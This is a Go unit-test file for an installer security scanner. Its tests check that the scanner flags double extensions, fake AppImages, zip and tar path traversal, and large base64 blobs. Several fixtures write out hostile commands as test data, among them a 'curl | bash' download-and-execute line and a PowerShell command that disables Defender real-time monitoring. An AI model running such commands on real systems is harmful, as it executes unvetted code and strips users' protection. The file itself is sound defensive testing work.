package app

import (
	"archive/tar"
	"archive/zip"
	"bytes"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

func writeTempFile(t *testing.T, name, content string) string {
	t.Helper()
	dir := t.TempDir()
	p := filepath.Join(dir, name)
	if err := os.WriteFile(p, []byte(content), 0o600); err != nil {
		t.Fatal(err)
	}
	return p
}

func hasCheck(rep SecurityReport, name, statusSub, detailSub string) bool {
	for _, c := range rep.Checks {
		if c.Name == name && (statusSub == "" || strings.Contains(c.Status, statusSub)) && (detailSub == "" || strings.Contains(strings.ToLower(c.Detail), strings.ToLower(detailSub))) {
			return true
		}
	}
	return false
}

func TestStructureDetectsDoubleExtension(t *testing.T) {
	p := writeTempFile(t, "invoice.pdf.exe", "MZfake")
	rep := ScanFile(p, SecurityOptions{AllowUnknown: true})
	if !hasCheck(rep, "Структура файла", "warning", "двойное") {
		t.Fatalf("double extension warning missing: %#v", rep.Checks)
	}
}

func TestStructureDetectsFakeAppImage(t *testing.T) {
	p := writeTempFile(t, "tool.AppImage", "not-elf")
	rep := ScanFile(p, SecurityOptions{AllowUnknown: true})
	if !hasCheck(rep, "Структура файла", "warning", "AppImage") {
		t.Fatalf("fake AppImage warning missing: %#v", rep.Checks)
	}
}

func TestStaticDetectsCurlPipeBash(t *testing.T) {
	p := writeTempFile(t, "install.sh", "#!/bin/sh\ncurl https://example.com/x | bash\n")
	rep := ScanFile(p, SecurityOptions{AllowUnknown: true})
	if !hasCheck(rep, "Статический анализ", "warning", "download-and-execute") {
		t.Fatalf("curl|bash warning missing: %#v", rep.Checks)
	}
}

func TestStaticDetectsDefenderDisable(t *testing.T) {
	p := writeTempFile(t, "setup.ps1", "Set-MpPreference -DisableRealtimeMonitoring $true\n")
	rep := ScanFile(p, SecurityOptions{AllowUnknown: true})
	if !hasCheck(rep, "Статический анализ", "unsafe", "Defender") {
		t.Fatalf("defender warning missing: %#v", rep.Checks)
	}
}

func TestStaticDetectsLargeBase64(t *testing.T) {
	p := writeTempFile(t, "loader.sh", strings.Repeat("A", 700))
	rep := ScanFile(p, SecurityOptions{AllowUnknown: true})
	if !hasCheck(rep, "Статический анализ", "warning", "base64") {
		t.Fatalf("base64 warning missing: %#v", rep.Checks)
	}
}

func TestEmptyInstallerWarns(t *testing.T) {
	p := writeTempFile(t, "empty.sh", "")
	rep := ScanFile(p, SecurityOptions{AllowUnknown: true})
	if !hasCheck(rep, "Структура файла", "warning", "пустой") {
		t.Fatalf("empty warning missing: %#v", rep.Checks)
	}
}

func TestWorldWritableWarns(t *testing.T) {
	p := writeTempFile(t, "open.sh", "echo ok")
	if err := os.Chmod(p, 0o666); err != nil {
		t.Fatal(err)
	}
	rep := ScanFile(p, SecurityOptions{AllowUnknown: true})
	if !hasCheck(rep, "Права и путь", "warning", "всем") {
		t.Fatalf("world writable warning missing: %#v", rep.Checks)
	}
}

func TestZipTraversalBlocks(t *testing.T) {
	dir := t.TempDir()
	p := filepath.Join(dir, "bad.zip")
	f, err := os.Create(p)
	if err != nil {
		t.Fatal(err)
	}
	zw := zip.NewWriter(f)
	w, _ := zw.Create("../evil.sh")
	_, _ = w.Write([]byte("bad"))
	_ = zw.Close()
	_ = f.Close()
	rep := ScanFile(p, SecurityOptions{AllowUnknown: true})
	if !hasCheck(rep, "Архив", "unsafe", "опасный") {
		t.Fatalf("zip traversal warning missing: %#v", rep.Checks)
	}
}

func TestZipClean(t *testing.T) {
	dir := t.TempDir()
	p := filepath.Join(dir, "good.zip")
	f, err := os.Create(p)
	if err != nil {
		t.Fatal(err)
	}
	zw := zip.NewWriter(f)
	w, _ := zw.Create("folder/readme.txt")
	_, _ = w.Write([]byte("ok"))
	_ = zw.Close()
	_ = f.Close()
	rep := ScanFile(p, SecurityOptions{AllowUnknown: true})
	if !hasCheck(rep, "Архив", "clean", "zip") {
		t.Fatalf("zip clean missing: %#v", rep.Checks)
	}
}

func TestTarTraversalBlocks(t *testing.T) {
	dir := t.TempDir()
	p := filepath.Join(dir, "bad.tar")
	f, err := os.Create(p)
	if err != nil {
		t.Fatal(err)
	}
	tw := tar.NewWriter(f)
	b := []byte("bad")
	_ = tw.WriteHeader(&tar.Header{Name: "../../evil", Size: int64(len(b)), Mode: 0o600})
	_, _ = tw.Write(b)
	_ = tw.Close()
	_ = f.Close()
	rep := ScanFile(p, SecurityOptions{AllowUnknown: true})
	if !hasCheck(rep, "Архив", "unsafe", "опасный") {
		t.Fatalf("tar traversal warning missing: %#v", rep.Checks)
	}
}

func TestTarClean(t *testing.T) {
	dir := t.TempDir()
	p := filepath.Join(dir, "good.tar")
	f, err := os.Create(p)
	if err != nil {
		t.Fatal(err)
	}
	tw := tar.NewWriter(f)
	b := []byte("ok")
	_ = tw.WriteHeader(&tar.Header{Name: "app/readme.txt", Size: int64(len(b)), Mode: 0o600})
	_, _ = tw.Write(b)
	_ = tw.Close()
	_ = f.Close()
	rep := ScanFile(p, SecurityOptions{AllowUnknown: true})
	if !hasCheck(rep, "Архив", "clean", "tar") {
		t.Fatalf("tar clean missing: %#v", rep.Checks)
	}
}

func TestUnsafeArchiveName(t *testing.T) {
	cases := []string{"../a", "/etc/passwd", "C:/Windows/a", "a/../../b"}
	for _, c := range cases {
		if !unsafeArchiveName(c) {
			t.Fatalf("%s should be unsafe", c)
		}
	}
	if unsafeArchiveName("app/readme.txt") {
		t.Fatal("safe archive name detected unsafe")
	}
}

func TestRunPlanContinueOnError(t *testing.T) {
	p := Plan{ContinueOnError: true, Commands: []CommandSpec{{Title: "fail", Cmd: []string{"sh", "-c", "exit 7"}}, {Title: "ok", Cmd: []string{"sh", "-c", "echo survived"}}}}
	r := RunPlan(p, false)
	if r.OK || !strings.Contains(r.Output, "survived") {
		t.Fatalf("continue-on-error did not continue: %#v", r)
	}
}

func TestCommandLineMasksVirusTotalKey(t *testing.T) {
	line := commandLine(CommandSpec{Cmd: []string{"instally"}, Env: map[string]string{"INSTALLY_VT_API_KEY": "secret", "NORMAL": "value"}})
	if strings.Contains(line, "secret") || !strings.Contains(line, "INSTALLY_VT_API_KEY=***") {
		t.Fatalf("key leaked in command line: %s", line)
	}
}

func TestVirusTotalSelfTestWithoutKeyNoLeak(t *testing.T) {
	t.Setenv("INSTALLY_DATA_DIR", t.TempDir())
	t.Setenv("INSTALLY_VT_API_KEY", "")
	out := VirusTotalSelfTestWithConfiguredKey()
	if !strings.Contains(out, "VirusTotal") || strings.Contains(out, eicarSHA256) {
		t.Fatalf("bad vt self-test output: %s", out)
	}
}

func TestBase64BlobScore(t *testing.T) {
	if base64BlobScore(strings.Repeat("A", 700)) == 0 {
		t.Fatal("base64 blob not detected")
	}
	if base64BlobScore("normal text") != 0 {
		t.Fatal("normal text false positive")
	}
}

func TestMagicKindPEAndELF(t *testing.T) {
	pe := writeTempFile(t, "a.exe", "MZ....")
	if magicKind(pe) != "PE" {
		t.Fatalf("PE not detected: %s", magicKind(pe))
	}
	elf := filepath.Join(t.TempDir(), "a")
	if err := os.WriteFile(elf, append([]byte{0x7f, 'E', 'L', 'F'}, bytes.Repeat([]byte{0}, 8)...), 0o600); err != nil {
		t.Fatal(err)
	}
	if magicKind(elf) != "ELF" {
		t.Fatalf("ELF not detected: %s", magicKind(elf))
	}
}
